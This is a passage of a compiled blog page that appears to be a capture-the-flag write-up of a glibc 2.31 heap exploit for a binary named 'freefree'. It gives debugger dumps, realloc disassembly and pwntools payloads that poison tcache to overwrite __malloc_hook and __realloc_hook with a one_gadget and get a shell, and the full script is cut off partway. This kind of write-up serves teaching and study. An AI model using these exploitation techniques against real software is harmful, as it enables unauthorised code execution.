0x00007f5c371c8006 \u003c+6\u003e:   push   r14\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8008 \u003c+8\u003e:   push   r13\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c800a \u003c+10\u003e:  push   r12\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c800c \u003c+12\u003e:  mov    r12,rsi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c800f \u003c+15\u003e:  push   rbp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8010 \u003c+16\u003e:  mov    rbp,rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8013 \u003c+19\u003e:  push   rbx\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8014 \u003c+20\u003e:  sub    rsp,0x18\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8018 \u003c+24\u003e:  mov    rax,QWORD PTR [rip+0x14cfc1]        # 0x7f5c37314fe0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c801f \u003c+31\u003e:  mov    rax,QWORD PTR [rax]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8022 \u003c+34\u003e:  test   rax,rax                             # Check if __realloc_hook is null or not\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8025 \u003c+37\u003e:  jne    0x7f5c371c8260 \u003c__GI___libc_realloc+608\u003e\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   ...\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8260 \u003c+608\u003e: mov    rdx,QWORD PTR [rsp+0x48]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8265 \u003c+613\u003e: add    rsp,0x18\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8269 \u003c+617\u003e: pop    rbx\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c826a \u003c+618\u003e: pop    rbp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c826b \u003c+619\u003e: pop    r12\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c826d \u003c+621\u003e: pop    r13\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c826f \u003c+623\u003e: pop    r14\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8271 \u003c+625\u003e: pop    r15\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x00007f5c371c8273 \u003c+627\u003e: jmp    rax\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So in our case that \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" is not null (we will overwrite with one gadget), it then \",(0,e.jsx)(n.code,{children:\"pop\"}),\" and execute the function inside \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\". So if we overwrite \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" with \",(0,e.jsx)(n.code,{children:\"realloc + 24\"}),\" (address is \",(0,e.jsx)(n.code,{children:\"0x00007f5c371c8018\"}),\"), which means we don\\u2019t push any register, but we can pop all 6 value on stack in to rbx, rbp, r12, r13, r14, r15, and also the stack didn\\u2019t change, we can control it more easily. And here is the status of stack:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d0\\u2502+0x0000: \"D=malloc(4096)\\\\n\"   \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4d8\\u2502+0x0008: \"(4096)\\\\n\"\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e0\\u2502+0x0010: 0x0000557c12fa02a0  \\u2192  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4e8\\u2502+0x0018: 0x0000557c12fc2020  \\u2192  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f0\\u2502+0x0020: 0x0000557c12fe4020  \\u2192  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f4f8\\u2502+0x0028: 0x0000557c13005010  \\u2192  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f500\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffec709f508\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"So if we successfully pop 6 register, those register will be changed! And we know that we can create chunk with index up to 25 so just simply malloc with the larger index, r12 and r15 will contain 0 after that 6 pop.\"}),`\n`,(0,e.jsx)(n.p,{children:\"And there is one more thing to notice:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  p\u0026__realloc_hook\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`$1 = (void *(**)(void *, size_t, const void *)) 0x7f5c37315b68 \u003c__realloc_hook\u003e\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/xg 0x7f5c37315b68\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x7f5c37315b68 \u003c__realloc_hook\u003e:  0x00007f5c371c7bf0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/xg 0x7f5c37315b68 + 0x8\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x7f5c37315b70 \u003c__malloc_hook\u003e: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/2xg 0x7f5c37315b68\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x7f5c37315b68 \u003c__realloc_hook\u003e:  0x00007f5c371c7bf0  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`                                  (__realloc_hook)     (__malloc_hook)\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"That means \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" and \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" is next to each other. So we can overwrite 2 of them at the same time easily. So that\\u2019s the idea. Now we start our final stage!\"]}),`\n`,(0,e.jsx)(n.p,{children:\"At the stage 2, we have chunk index 2 has size of 0xcf0, next to chunk 2 is the freed top chunk contain the forward pointer and backward pointer due to tcache link list:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x0000557c12fe4020 - 0x10\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4010: 0x0000000000000000  0x0000000000000cf1    \u003c-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4020: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4030: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4040: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4050: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10xg 0x0000557c12fe4020 - 0x10 + 0xcf0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d00: 0x0000000000000000  0x00000000000002e1    \u003c-- Second freed top chunk\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d10: 0x0000557c12fc2d10  0x0000557c12fa0010\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d20: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d30: 0x0000000000000000  0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x557c12fe4d40: 0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Notice that the freed top chunk size changed to \",(0,e.jsx)(n.code,{children:\"0x2e1\"}),\". So now we overwrite forward pointer with \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\", just keep the same size as \",(0,e.jsx)(n.code,{children:\"0x2e0\"}),\" to make sure there\\u2019s no error (address changed):\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Prevsize\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2e1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'__realloc_hook'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And then we just malloc 2 chunk with the same size \",(0,e.jsx)(n.code,{children:\"0x2e0\"}),\", we will get the second chunk is \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" address:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(3, 0x2e0-0x10)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`malloc(3, 0x2e0-0x10)\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can see the \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" address is saved on stack:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f70\\u2502+0x0000: \"D=malloc(720)\\\\n\"  \\u2190 $rax, $rsp, $rdi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f78\\u2502+0x0008: 0x00000a2930323728 (\"(720)\\\\n\"?)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f80\\u2502+0x0010: 0x0000559462b382a0  \\u2192  0x0000000000000000    \u003c-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f88\\u2502+0x0018: 0x0000559462b5a020  \\u2192  0x0000000000000000    \u003c-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f90\\u2502+0x0020: 0x0000559462b7c020  \\u2192  0x0000000000000000    \u003c-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968f98\\u2502+0x0028: 0x00007f6549689b68  \\u2192  0x00007f654953bbf0  \\u2192  \u003crealloc_hook_ini+0\u003e endbr64\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968fa0\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffcd4968fa8\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So we successfully malloc with \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\". Now we just need to change value of \",(0,e.jsx)(n.code,{children:\"__realloc_hook\"}),\" and \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" and that\\u2019s the easiest part in the world. Remember that we will write address of \",(0,e.jsx)(n.code,{children:\"realloc + 24\"}),\" to \",(0,e.jsx)(n.code,{children:\"__malloc_hook\"}),\" so it just pop, not push and the stack is remain until 6 \",(0,e.jsx)(n.code,{children:\"pop\"}),\", also the constraints is satisfied:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6aee\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'realloc'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Running script and stop before first \",(0,e.jsx)(n.code,{children:\"pop\"}),\", the stack look like this\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ed0\\u2502+0x0000: 0x0000556efad732a0  \\u2192  0x0000000000000000    \u003c-- Chunk index 0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ed8\\u2502+0x0008: 0x0000556efad95020  \\u2192  0x0000000000000000    \u003c-- Chunk index 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ee0\\u2502+0x0010: 0x0000556efadb7020  \\u2192  0x0000000000000000    \u003c-- Chunk index 2\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ee8\\u2502+0x0018: 0x00007fa6716c4b68  \\u2192  0x00007fa6715bfaee  \\u2192  \u003cexecvpe+638\u003e mov rdx, r12\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ef0\\u2502+0x0020: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5ef8\\u2502+0x0028: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5f00\\u2502+0x0030: 0x0000000000000000\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`0x00007ffc992c5f08\\u2502+0x0038: 0x0000000000000000\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The assembly code at pop look like this:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/10i $rip\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`=\u003e 0x7fa671577269 \u003c__GI___libc_realloc+617\u003e:  pop    rbx\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa67157726a \u003c__GI___libc_realloc+618\u003e:  pop    rbp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa67157726b \u003c__GI___libc_realloc+619\u003e:  pop    r12\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa67157726d \u003c__GI___libc_realloc+621\u003e:  pop    r13\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa67157726f \u003c__GI___libc_realloc+623\u003e:  pop    r14\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa671577271 \u003c__GI___libc_realloc+625\u003e:  pop    r15\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   0x7fa671577273 \u003c__GI___libc_realloc+627\u003e:  jmp    rax\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Just 6 pop, if we increase the index of chunk a bit, we can get r12 and r15 null easily. So we will add a variable called \",(0,e.jsx)(n.code,{children:\"n\"}),\" plus with all index to increase the index, this is more effective way than changing index one by one, it can make you confused.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"For example, with the \",(0,e.jsx)(n.code,{children:\"gets(3, payload)\"}),\" at the end, we will change it to \",(0,e.jsx)(n.code,{children:\"gets(3+n, payload)\"}),\" and with n can be changed. I will choose \",(0,e.jsx)(n.code,{children:\"n=10\"}),\" and new index will be 10, 11, 12, 13 and 14. That\\u2019s the perfect index and we now get the shell.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Full code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` subprocess\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` time\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` string\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'./libc-2.31.so'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token boolean\",children:\"False\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" exe \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'./freefree'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token boolean\",children:\"False\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# context.log_level = 'debug'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'one_gadget'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6aee\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'main_arena'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1ec1e0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"getchar\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"return\"}),\" string\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"ascii_uppercase\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"malloc\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" num\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tp\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\u003e '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'{}=malloc({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" num\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"gets\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tp\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\u003e '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gets({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\ttime\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sleep\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tp\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendline\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"puts\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token 